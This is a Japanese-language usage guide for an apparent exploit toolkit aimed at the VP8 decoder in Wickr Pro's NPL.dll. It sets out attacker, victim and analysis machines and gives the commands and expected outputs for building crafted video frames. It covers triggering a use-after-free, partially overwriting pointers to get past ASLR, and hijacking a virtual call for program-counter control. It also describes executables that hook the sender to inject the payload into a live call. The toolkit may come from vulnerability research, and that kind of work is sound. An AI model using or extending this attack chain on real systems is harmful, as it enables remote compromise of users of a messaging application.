# W5 ツール使用法リファレンス

## ★ どの機で何を走らせるか（先にこれ）

| 機 | 走らせるもの | メモリ引数 |
|---|---|---|
| **解析機（この端末）** | 以下の Python ツール**全部** | `1524` を渡して被害者機を**模擬**する |
| **被害者機（4032MB, 空きコミット 1524 MiB）** | `victim_probe.exe` **のみ** | **不要**（実際に空きが 1524 MiB なので絞る必要がない） |
| **攻撃者機（通常機）** | `sender_inject.exe` **のみ** | 不要 |

**被害者機に Python もハーネスも要らない。**渡すのは EXE 1 本とランブックだけ。

**なぜローカルで模擬するのか:** ライブの試行回数を減らすため。ジオメトリ選択・狙う値の決定・
ペイロードがデコーダを通るかの確認をここで先に潰す。被害者機で総当たりすると毎回 2 GiB の
確保要求で機械が固まり、第3段では被害者プロセスが落ちる。ここで詰めておけばライブは
答え合わせだけで済む。

以下の Python ツールは**全部この端末で**実行する。`E:\tmp\wickr\scratch\w4\fuzz-vp8\` 内。
依存: Python 3.12 / `pefile` / `capstone`（導入済み）。管理者権限は不要。

```
cd E:\tmp\wickr\scratch\w4\fuzz-vp8
```

**共通の注意 — 再実行が要る場合がある。** `uaf_*` と `steer*` は起動時に
`VP8_COMMON` をメモリ走査で探す。この走査は他スレッドと競合して
**3〜4 回に 1 回くらい空振り**する。その場合は

```
[!] VP8_COMMON not located (scan flake - no data, not a negative)
```

と出て終了する。**これは「否定的結果」ではなく「データなし」**。そのまま再実行すればよい。
`[CONFIRMED]` か `[NOT DEMONSTRATED]` のどちらかが出るまで回す。

---

## 1. 準備・生成系

### `findtables.py` — 引数なし
出荷 NPL.dll から VP8 の確率テーブルを抽出して `vp8_tables.json` を書く。
`vp8modes.py` がこれを読むので、**最初に 1 回だけ**実行が要る（済み）。

```
python findtables.py
```
期待出力: 各テーブルが `1 hit(s)` でユニークに見つかること。複数ヒットしたら疑う。

### `gen_e2e_payload.py` — 引数なし（設定はファイル内）
ライブ用の VP8 フレーム 3 枚 + `manifest.json` を `e2e-payload/` に書く。
書く前に必ず実物のデコーダに通し、通らなければ**書かずに終了**する。

```
python gen_e2e_payload.py
```
狙う値を変えるとき: ファイル冒頭の

* `TARGET_LOW32` — 部分上書きで書き込む下位 32 ビット
* `W = H = 64` — 1 枚目のジオメトリ（解放ブロックのサイズクラスとスロット位置が決まる）

を編集して**再実行**する。

> **重要:** `C_splitmv_inter.vp8` は算術符号化なので、狙う値はファイル中に生バイトとして
> 存在しない。**バイトパッチは不可能。**必ずこのスクリプトを再実行して作り直すこと。

---

## 2. 内容操作の検証系（UAF なし・健全なデコーダ相手）

### `steer.py [W] [ROW] [COL]`
既定 `64 582 1128`。1 マクロブロックに指定 MV が入るか。

```
python steer.py
python steer.py 128 100 -200
```
成功: `[CONFIRMED] MODE_INFO[0].mv = ... == requested ...`

### `steer2.py [W]`
既定 `256`。多数の MB に**それぞれ別の** MV を入れて全数照合＋アルファベット計測。

```
python steer2.py 256
```
成功: `verified 64/64 steered macroblocks ... 0 mismatched`

### `steer3.py [W]`
既定 `128`。SPLITMV（1 レコードあたり 64 バイト連続）を検証。

```
python steer3.py 128
```
成功: `16/16 macroblocks carry all 16 requested sub-vectors`

---

## 3. UAF 本体（要コミット上限）

### `uaf_steer.py [commit_cap_MiB] [W] [--control]`
既定 `700 64`。A→B→C を回し、**dangling `pc->mi` 経由で指定値が着弾するか**。

```
python uaf_steer.py 1524 64            # 被害者の実測値でモデル化
python uaf_steer.py 1524 64 --control  # W4 の未符号化ペイロード（対照実験）
```
* 第1引数はこのプロセスのコミット上限（ジョブオブジェクト）。**被害者の空きコミット値を入れる。**
* 成功: `[CONFIRMED] 4/4 attacker-chosen motion vectors written through the dangling pc->mi`
* `--control` は `0/4` になるのが**正しい**（W4 の誤りを再現する対照）

### `uaf_partial.py [commit_cap_MiB] [W] [ROW]`
既定 `700 64`、ROW 省略時は最終行。**ASLR を生き残る部分上書き**（下位32ビットのみ書換）。

```
python uaf_partial.py 1524 64      # 最終行のクリーンスロット
python uaf_partial.py 1524 64 1    # 行1のクリーンスロットを狙う
```
* `W` は **mb_cols/mb_rows が両方偶数**になる値（32, 64, 96, ...）のみ。奇数だと 8 バイト境界に乗らず拒否される。
* 成功: `low half ... : YES` かつ `high half (ASLR entropy) preserved : YES`

### `uaf_pc.py [commit_cap_MiB]`
既定 `700`。W 固定 64。**PC 制御まで**（仮想呼び出しを乗っ取って攻撃者関数を実行）。

```
python uaf_pc.py 1524
```
成功: `called slot 0 -> returned 0xc0de` → `[CONFIRMED] PC control from F4-2`
※ 再取得対象はハーネスが用意したもの。**exploitability-if-reachable** の資格付き。

### `gate2ctx.py [headroom_MiB]`
既定 `3900`。2 コンテキストでゲートが開く閾値を測る。

```
python gate2ctx.py 4100    # 閉じる
python gate2ctx.py 4000    # 開く（閾値 = 2 x 2017 = 4034）
```
> **今回の被害者（空きコミット 1524 MiB）には不要。** 1 発目で失敗するので 2 コンテキストは使わない。

---

## 4. 標的選定・調査系

### `nplgraph.py` — 引数なし
NPL のメディアグラフをこのプロセスに立て、ノードごとの heap 割り当てを列挙し、
F4-2 が到達できるオフセットにポインタがあるかを判定する。**通話不要。**

```
python nplgraph.py
```
※ 実行に数分かかる。`PacketQueue` / `PacketMonitor` / `Puller` が 1702 バイトブロックを持ち、
到達可能スロットにポインタがあることを確認済み。

### `pktfield_scan.py` — 引数なし
NPL 全 `.pdata` 関数を走査し、メディアパケットの到達可能オフセット
（`+0x108` / `+0x118`）にポインタを書く箇所があるかを探す。

```
python pktfield_scan.py
```
結果: 該当は初期化（ゼロ書き）のみ → **パケット本体は標的として除外**。

---

## 5. 使わないもの（誤り／動作せず）

| ツール | 状態 |
|---|---|
| `ptrarray_scan.py [pid] [MIN_RUN]` | **数値が誤り。**ポインタ「連なりの長さ」を攻撃者のブロックサイズと比較していたが、一致すべきなのは**割り当てサイズ**。出力の 0.9% は引用しないこと |
| `heapblock_scan.py [pid] [MAXBLOCKS]` | ToolHelp のヒープ列挙が `ERROR_NO_MORE_FILES` を返すため**動作せず**。`nplgraph.py`（自プロセス内 HeapWalk）で代替済み |

---

## 6. 未作成（これから渡すもの）

| ツール | 実行機 | 予定引数 |
|---|---|---|
| `victim_probe.exe` | 被害者機（4032MB） | `victim_probe.exe [--pid N]` — 省略時 WickrPro を自動検出。結果は `victim-probe.log` に追記。Ctrl+C でフック復元 |
| `sender_inject.exe` | 攻撃者機（通常機） | `sender_inject.exe <payload_dir>` — `e2e-payload/` を渡す。バイト照合してから当て、不一致なら拒否、終了時に自動復元。`--unhook` で明示復元 |

**送信側は通話を始める前に当てること**（グラフは通話開始時に1回だけ構築されるため、
通話中のパッチは効かない。これは Wave 3 で確認済みの落とし穴）。
